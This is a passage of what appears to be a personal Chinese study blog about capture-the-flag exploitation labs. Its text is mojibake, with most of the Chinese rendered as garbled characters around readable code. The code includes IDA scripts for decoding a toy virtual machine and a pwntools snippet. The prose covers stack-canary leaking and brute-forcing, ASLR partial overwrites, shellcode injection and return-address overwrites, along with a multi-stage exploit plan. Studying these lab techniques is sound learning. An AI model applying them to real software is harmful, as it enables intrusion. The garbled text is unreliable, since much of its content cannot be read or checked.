æ³•æ“ä½œ.</p></blockquote><p>è¿™é¢˜æ˜¯0x81ä½ç½®ä¸Šå…ˆæ”¾ä¹ä¸ªæ•°, ç„¶åå†åˆ†åˆ«åŠ ä¸Šä¸€ä¸ªæ•°å­—, ç„¶å, å°±é‚£æ ·..</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>è¿˜æ˜¯åŠ ä¸Šä¸€ä¸ªæ•°, å‹‰å¼ºåšä¸€ä¸‹. æœç„¶æ˜¯æµªè´¹æ—¶é—´.</p><h3 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h3><blockquote><p>å¼€å§‹Yan85 byte code. ç›´æ¥ä»æ²¡æœ‰ç¬¦å·çš„ç‰ˆæœ¬å…¥æ‰‹å¼€å§‹å åœ(</p></blockquote><p><del>IDAåç¼–è¯‘å‡ºäº†é—®é¢˜, å®åœ¨æ˜¯é€†è½¬å‰ä¸‰ä¸ªå­—èŠ‚é¡ºåºçš„æ±‡ç¼–ä»£ç å¤ªç¥å¥‡, ä¸€å †ç¬¦å·æ‹“å±• é›¶æ‹“å±•ä»€ä¹ˆçš„.</del> ç„¶åå‘ç°å¹¶æ²¡æœ‰é—®é¢˜.</p><p>å‘ç°æŒ‡ä»¤ç¼–ç æ˜¯è¿™æ ·ä¸€ä¸ªç»“æ„:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inst</span></span><br><span class="hljs-class">&#123;</span><br>  __int8 oprnd_1;<br>  __int8 opcode;<br>  __int8 oprnd_2;<br>  __int8 pedding; <span class="hljs-comment">//useless</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>åœ¨IDAä¸­ä½¿ç”¨IDCç¼–å†™è„šæœ¬(gdb scriptä¹Ÿè¡Œ, ä¹Ÿå¯ä»¥è®¾ç½®ä¸´æ—¶å˜é‡ä¹‹ç±»çš„).</p><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = SIL;<br><span class="hljs-keyword">auto</span> reg2 = (ESI &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br>msg(<span class="hljs-string">&quot;\tADD: %s = %s + %s\n&quot;</span>, s1, s1, s2);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="POP"><a href="#POP" class="headerlink" title="POP:"></a>POP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>);<br><span class="hljs-keyword">auto</span> s1;<br><br><span class="hljs-comment">//çœç•¥åˆ¤æ–­å¯„å­˜å™¨åç§°çš„éƒ¨åˆ†ä»£ç </span><br><br>msg(<span class="hljs-string">&quot;\tPOP: %s=0x%x is %c, rsp=0x%x\n&quot;</span>, s1, RDX, RDX, RSI<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="STM"><a href="#STM" class="headerlink" title="STM:"></a>STM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//çœç•¥åˆ¤æ–­å¯„å­˜å™¨åç§°çš„éƒ¨åˆ†ä»£ç </span><br><br>msg(<span class="hljs-string">&quot;\tSTM: *%s = %s\n&quot;</span>, s1, s2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="LDM"><a href="#LDM" class="headerlink" title="LDM:"></a>LDM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//çœç•¥åˆ¤æ–­å¯„å­˜å™¨åç§°çš„éƒ¨åˆ†ä»£ç </span><br><br><span class="hljs-keyword">auto</span> mem = AL;<br>msg(<span class="hljs-string">&quot;\tLDM: %s = *(%s); mem:0x%x\n&quot;</span>, s1, s2, mem);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP:"></a>CMP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//çœç•¥åˆ¤æ–­å¯„å­˜å™¨åç§°çš„éƒ¨åˆ†ä»£ç </span><br><br><span class="hljs-keyword">auto</span> r1=get_wide_byte(RBP<span class="hljs-number">-0x2</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RBP<span class="hljs-number">-0x1</span>);<br>msg(<span class="hljs-string">&quot;\tCMP: %s:%s 0x%x:0x%x\n&quot;</span>, s1, s2, r1, r2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="print-all-regs"><a href="#print-all-regs" class="headerlink" title="print all regs:"></a>print all regs:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> r1=get_wide_byte(RDI+<span class="hljs-number">1024</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RDI+<span class="hljs-number">1025</span>);<br><span class="hljs-keyword">auto</span> r3=get_wide_byte(RDI+<span class="hljs-number">1026</span>);<br><span class="hljs-keyword">auto</span> r4=get_wide_byte(RDI+<span class="hljs-number">1027</span>);<br><span class="hljs-keyword">auto</span> r5=get_wide_byte(RDI+<span class="hljs-number">1028</span>);<br><span class="hljs-keyword">auto</span> r6=get_wide_byte(RDI+<span class="hljs-number">1029</span>);<br><span class="hljs-keyword">auto</span> r7=get_wide_byte(RDI+<span class="hljs-number">1030</span>);<br><br>msg(<span class="hljs-string">&quot;\t    [V] r1:0x%x r2:0x%x r3:0x%x r4:0x%x r5:0x%x r6:0x%x r7:0x%x\n&quot;</span>, r1,r2,r3,r4,r5,r6,r7);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><p>è®¾ç½®å®Œä¹‹åå°±ä¼šå‡ºç°éå¸¸æ¼‚äº®çš„ä¸€ä¸ªè¾“å‡º, ä¸è¿‡å¾ˆé•¿, è€Œä¸”è¿™ç§è¾“å‡ºæ˜¯ä¼šè·Ÿç€ç¨‹åºæµå˜åŒ–çš„, ä¸åˆ©äºæ•´ä½“ä¸Šçš„é™æ€åˆ†æ. ä¸‹æ¬¡å°è¯•é¿å¼€æ‰€æœ‰è·³è½¬, æŒ‰é¡ºåºæ‰“å°å‡ºæ‰€æœ‰çš„ä»£ç , ä¸ç„¶è·³æ¥è·³å»çš„çœŸçš„å¾ˆéš¾çœ‹.</p><p>ç»“æœå°±æ˜¯ç®€å•çš„åˆ¤æ–­å­—ç¬¦ä¸²ç›¸ç­‰, æ€»å…±9å­—èŠ‚. éƒ½åœ¨logæ–‡ä»¶é‡Œ.</p><h3 id="level17-1"><a href="#level17-1" class="headerlink" title="level17"></a>level17</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>å…ˆè·³è¿‡, æ„Ÿè§‰å°±æ˜¯å¤æ‚åº¦çš„å †ç§¯, åˆæˆ–è€…æ˜¯æˆ‘æ–¹å‘é”™äº†. åˆ°æ—¶å›æ¥çœ‹.</p><h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>Yan85 shellcoding. ç›´æ¥åš<code>.0</code>é¢˜ç›®, çœç‚¹äº‹.</p><p>è¾“å…¥<code>0x300uLL</code>å­—èŠ‚çš„bytecode, å‰768å­—èŠ‚æ˜¯æŒ‡ä»¤æœ€å¤š256æ¡, åé¢æ˜¯å†…å­˜ç©ºé—´, å†åé¢æ˜¯å¯„å­˜å™¨.</p><p>å®Œå…¨ç”±æˆ‘æ§åˆ¶çš„è¯é¦–å…ˆæ˜¯å¾€å†…å­˜ä¸­æ”¾å…¥/flagå­—ç¬¦ä¸², ç„¶åopen(path in memory) -&gt; read to memory -&gt; write to stdout. å†ç»“åˆä¸€ä¸‹é¢˜ç›®é‡Œçš„å¯„å­˜å™¨, æ“ä½œæ•°å’Œé¡ºåºå°±è¡Œ. ä¼°è®¡å¾—å†™ä¸ªpythonå‡½æ•°è‡ªåŠ¨ç”Ÿæˆ.</p><h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p>æ›´ç‰¹åˆ«äº†. ä¸»è¦æ˜¯è¿™ä¸ª<code>rerandomize()</code>å‡½æ•°, å…¶ä¸­å¯„å­˜å™¨, æŒ‡ä»¤, ç³»ç»Ÿè°ƒç”¨, cmpæ ‡å¿—ä½å…¨éƒ¨éƒ½æ˜¯éšæœºçš„. éšæœºçš„æ–¹æ³•æ˜¯8ä¸ªint8éšæœºé€‰å–ä¸¤ä¸ªè¿›è¡Œäº¤æ¢, æ‰§è¡Œ65535æ¬¡.</p><p>éš¾é“æ˜¯åœ¨å˜åŒ–ä¸­æ‰¾åˆ°ä¸å˜çš„ä¸œè¥¿?</p><p>å™¢è™½ç„¶æ˜¯éšæœºçš„ä½†æ˜¯ç”±äºrandçš„ç‰¹ç‚¹(ç§å­å’Œflagæœ‰å…³), æ¯æ¬¡çš„å€¼éƒ½ä¸ä¼šå˜, è¿™æ ·å­åªè¦ç¼–å†™ä¸€äº›logicå»brute forceä¸€äº›æŒ‡ä»¤å’Œå€¼å°±å¯ä»¥äº†.</p><h1 id="module-8-exp"><a href="#module-8-exp" class="headerlink" title="module 8-exp"></a>module 8-exp</h1><ul><li>æ—¶è‡³2022å¹´4æœˆ22æ—¥, cè¯­è¨€æ’å<a href="https://www.tiobe.com/tiobe-index/">ç¬¬äºŒä½</a>, å†å²æœ€ä½ä¸ºç¬¬äºŒä½. å¤§éƒ¨åˆ†é€†å‘å·¥å…·åç¼–è¯‘å‡ºçš„ç»“æœéƒ½æ˜¯ç±»Cè¯­è¨€, å› ä¸ºcè¯­è¨€æ˜¯æœ€æ¥è¿‘æ±‡ç¼–çš„è¯­è¨€, è¿˜ç»™äº†å¼€å‘è€…ä¸€ç§ä½¿ç”¨é«˜çº§è¯­è¨€è€Œä¸æ˜¯ç›´æ¥é€šè¿‡æ±‡ç¼–å»æ“ä½œå¯„å­˜å™¨çš„é€‰æ‹©, è¢«å¤§é‡ä½¿ç”¨åœ¨æ“ä½œç³»ç»Ÿå’Œå…¶ä»–è½¯ä»¶çš„ä»£ç ä¸­. è€Œcè¯­è¨€çš„å†…å­˜å®Œå…¨æ§åˆ¶æ‰€å¸¦æ¥çš„é—®é¢˜åœ¨near futureä¸ä¼šæ¶ˆå¤±, æ¯”å¦‚è¯´ä¸€äº›åµŒå…¥å¼è®¾å¤‡éœ€è¦cè¯­è¨€æ¥å¼€å‘ç­‰ç­‰.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = gdb.debug(<span class="hljs-string">&#x27;./balabala&#x27;</span>)<br>test_string = cyclic(<span class="hljs-number">128</span>) <span class="hljs-comment"># used to identify the location of overflow string</span><br>cyclic_find(<span class="hljs-string">&quot;gaaa&quot;</span>)<br></code></pre></div></td></tr></table></figure><ul><li><p>stack canary mitigations:</p><ul><li><p><strong>leak the canary.</strong> </p></li><li><p><strong>brute-force the canary(for forking processes)</strong> </p></li><li><p><strong>modify the canary.</strong>  </p></li><li><p>by forking processes, it can test repeatedly and figure out what the canary is.</p></li><li><p>the canary begins with null-byte.</p></li></ul></li><li><p>alsr mitigation:</p><ul><li>because all segments are aligned to 0x1000, so changing the least significant byte in a pointer can redirect the flow to another position.</li><li><code>setarch x86_64 -R /bin/zsh</code> command</li></ul></li><li><p>uninitilized data.</p><ul><li>but gcc with high level optimization will probably remove the memset function, as it seems to be pointless.</li></ul></li></ul><hr><ul><li>æ•´äº†pwndbg+tmuxçš„ç»„åˆè§†å›¾, æ„Ÿè§‰, æœ‰ä¸€ç‚¹ç‚¹ç‚¹ç‚¹ç”¨å§â€¦<p hidden>æˆ‘æ˜¯çœŸæœ‰ç²¾åŠ›æè¿™ä¸ªâ€¦</p>æˆåŠŸåœ¨tmuxé‡Œé¢å¥—å¨ƒscreen.</li><li>ä½¿ç”¨gdbåŠ ä¸Šcoreæ–‡ä»¶ <a href="https://stackoverflow.com/questions/8305866/">stackoverflow</a> <ul><li><strong>ulimit -c unlimited</strong> : è§£é™¤core dumpæ–‡ä»¶å¤§å°é™åˆ¶, æˆ–è€…ç›´æ¥åŠ åœ¨zshrcé‡Œé¢.</li><li>ç„¶å<code>gdb-pwndbg [filename] [coredump]</code> </li><li>è§†é¢‘ä¸­ä½¿ç”¨äº†cyclicåŠ ä¸Šgdb coreæ¥æŸ¥çœ‹è¿”å›åœ°å€ä»è€Œå‘ç°bufçš„æº¢å‡ºä½ç½®.</li><li>ä¹Ÿå¯ä»¥ä½¿ç”¨valgrind, ä¸è¿‡å‚æ•°è¾ƒå¤š.</li><li>pwnä¹Ÿæœ‰coredumpå‡½æ•°.</li></ul></li></ul><h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1-2"></a>level1-2</h4><p>ç®€å•çš„å¿˜è®°äº†</p><h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3-4"></a>level3-4</h4><p>ä¿®æ”¹è¿”å›åœ°å€. </p><h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>gdb è°ƒè¯•å‡ºç°é—®é¢˜, readä¸€ä¸ªå¤§æ•°å­—å°±ä¼šbad address, ç›´æ¥æ‰§è¡Œæ²¡æœ‰å‡ºç°â€¦.</p><h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>é‡å¤åˆ©ç”¨å †æ ˆ, ä¿®æ”¹è¿”å›åœ°å€åé¡ºæ‰‹æ”¹å†™rbp+0x4å¼€å§‹çš„å››å­—èŠ‚ä¸º0x1337(4919)</p><p>challengeå †æ ˆæœ‰æ²¡æœ‰å®ç”¨çš„ä½ç½®, åº”è¯¥å°±æ˜¯å¯¹é½.</p><p>å‘ç°æ²¡å•¥ç‰¹åˆ«çš„, å°±æ˜¯å›ºå®š0x40000åœ°å€, ç„¶åè·³è¿‡win_authçš„éªŒè¯æ¡ä»¶ç›´æ¥æ‰§è¡Œread flag</p><h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>å’Œrevçš„18é¢˜å·®ä¸å¤š, ä½†æ˜¯Yan85çš„open syscallè¢«ç¦ç”¨. ä»–è¯´æœ‰ä¸ªmemory error, åœ¨å“ªé‡Œå‘¢.</p><p>ä¿æŠ¤å…¨å…³, å¯æ‰§è¡Œæ ˆ. æ ¹æœ¬æ²¡æœ‰openè¿™ä¸ªlibcå‡½æ•°, éœ€è¦hijack shellcode, æ³¨å…¥åˆ°å“ªé‡Œå‘¢? </p><p>å‘ç°äº†, ä¸€ä¸ªreadåˆ°æ ˆç©ºé—´çš„è°ƒç”¨æ²¡æœ‰æ£€æŸ¥è¾¹ç•Œ:</p><img src="../../image/pwn-modules/image-20220503162403150.png" alt="image-20220503162403150" style="zoom:80%;" /><ul><li>ä¸è¿‡è¦æ³¨æ„r2å’Œr3åªæœ‰1å­—èŠ‚, æœ€å¤šå°±æ˜¯256. </li><li>åæ­£å„ç§ä¿æŠ¤éƒ½æ²¡å¼€, å¯ä»¥ç›´æ¥å®šä½shellcodeçš„ä½ç½®. æ€»å…±é•¿36å­—èŠ‚.</li><li>shellcodeå¾—è°ƒç”¨syscall, è¿˜æ˜¯ç”¨chmodç®€å•ç‚¹, shellcodeå°±åŠ åœ¨ä¸€å¼€å§‹çš„byte codeä¸­. å¯¹shellcodeè¿›è¡ŒYan85è¯‘ç å¯èƒ½ä¼šå‡ºé—®é¢˜, åœ¨byte codeç»“æŸä¹‹å‰è¿˜è¦ä¿®æ”¹r6çš„å€¼æ¥ç›´æ¥è·³åˆ°æŒ‡ä»¤çš„æœ«å°¾.</li><li>Yan85 codeç›´æ¥ä»memory[1024]å¼€å§‹, è¦†ç›–8B register, 9B stack space, 8B saved rbp, and finally, the <code>retaddr</code> to the position of shellcode. <ul><li>è¿˜æœ‰ä¸€äº›ç»†èŠ‚, è¦†ç›–r6çš„æ—¶å€™å¯ä»¥ç›´æ¥ä¿®æ”¹æˆ256åœ¨ä¸‹ä¸€æ¬¡è¯‘ç ç»“æŸæ‰§è¡Œ, è¿™æ ·å­å°±ä¸ç”¨å¤šä½™çš„æ“ä½œä¿®æ”¹r6.</li></ul></li></ul><h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>è¿™é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¹‹ä¸ŠåŠ äº†canaryå’ŒPIE.</p><p>å…¶ä½™éƒ¨åˆ†åº”è¯¥æ˜¯ä¸€æ ·çš„, æº¢å‡ºç‚¹ä¹Ÿæ˜¯ä¸€æ ·çš„. å¯¹äº†, writeå‡½æ•°ä¹Ÿæ²¡æœ‰è¾¹ç•Œæ£€æŸ¥, å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥leakå‡ºcanaryå’Œrbp.</p><h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>ä¿æŠ¤åŠå¼€, å¯ç”¨open, <strong>disallowed read_code</strong>, no bundary check in read, but write has.</p><p>åªå…è®¸byte codeä¸­å‡ºç°ä¸€æ¬¡syscall.</p><p>ä½†æ˜¯å‘ç°read_memoryçš„ç›®çš„åœ°å˜æˆäº†æŒ‡ä»¤çš„åŒºåŸŸ. äºæ˜¯å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªè°ƒç”¨æ¥è¾“å…¥æ–°çš„ä»£ç å»è¦†ç›–æ—§çš„.</p><h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>è¿™æ¬¡åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šè¡¥ä¸Šäº†read_memoryçš„é”™è¯¯, ä»ç„¶åªèƒ½ç”¨ç”¨ä¸€æ¬¡syscall. <strong>è¾¹ç•Œæ£€æŸ¥å…¨å¼€</strong>.</p><p>è¿™???</p><h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>JIT pray, Yan85_64, ä¿æŠ¤å…¨å¼€, å…¨æ–°é€»è¾‘, æš‚ä¸”æ”¾å¼ƒ.</p><h1 id="module-9-mem"><a href="#module-9-mem" class="headerlink" title="module 9-mem"></a>module 9-mem</h1><p>nothing special.</p><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>canary disabled.</p><p>inject shellcode to a map region, and then overwrite return address to jmp to executing shellcode.</p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>ä¿æŠ¤å…¨å…³. å¯æ‰§è¡Œæ ˆ. ç¡®å®æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿, æ²¡å¼€PIEçš„è¯æ ˆçš„ä½ç½®éƒ½æ˜¯ä¸€æ ·çš„, shellcodeæ³¨å…¥çš„åœ°ç‚¹ä¹Ÿå¯ä»¥ä½¿ç”¨ç»å¯¹åœ°å€æ¥ç¡®å®š.</p><h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><img src="../../image/pwn-modules/image-20220430102917561.png" alt="image-20220430102917561" style="zoom:80%;" /><p>æ ˆä¸Šçš„åœ°å€æœ€ä½12ä½éƒ½æ˜¯éšæœºçš„. æ€•ä¸æ˜¯æ¯æ¬¡è¿è¡Œçš„æ—¶å€™_startå’Œ__libc_start_mainå‡½æ•°éƒ½ä¼šç”¨åˆ°ä¸åŒçš„æ ˆç©ºé—´å¤§å°â€¦ä¹Ÿè®¸æ˜¯aslræŠŠstackbaseä¹Ÿæ”¹äº†.<br>è¿™ä¸‹å­åªèƒ½è¿rbpéƒ½ç»™leakå‡ºæ¥äº†.</p><ol><li>first exec <code>challenge</code> to <strong>leak canary</strong> and inject <strong>shellcode</strong>.</li><li>second exec to leak first challengeâ€™s <strong>rbp</strong>, and then calc the shellcode position.</li><li>third exec to jmp to shellcode.</li></ol><p><del>ä¸å¯¹, ç¬¬ä¸€æ¬¡leak canaryçš„æ—¶å€™ä¹Ÿå¯ä»¥leakå‡ºmainçš„rbp,</del> æ²¡äº‹äº†, mainçš„rbpå¯ä»¥ç”¨ä½†æ²¡å¿…è¦.</p><ul><li>æ²¡æœ‰push imm64è¿™æ¡æŒ‡ä»¤.</li><li>ä¸€å¼€å§‹ç”¨chmod+.ascii â€œflagâ€çš„åšæ³•, å‘ç°è‡ªå·±åŠ äº†ä¸€ä¸ªç©ºå­—ç¬¦, åªèƒ½é€šè¿‡æ ˆæ¥å°è¯•. 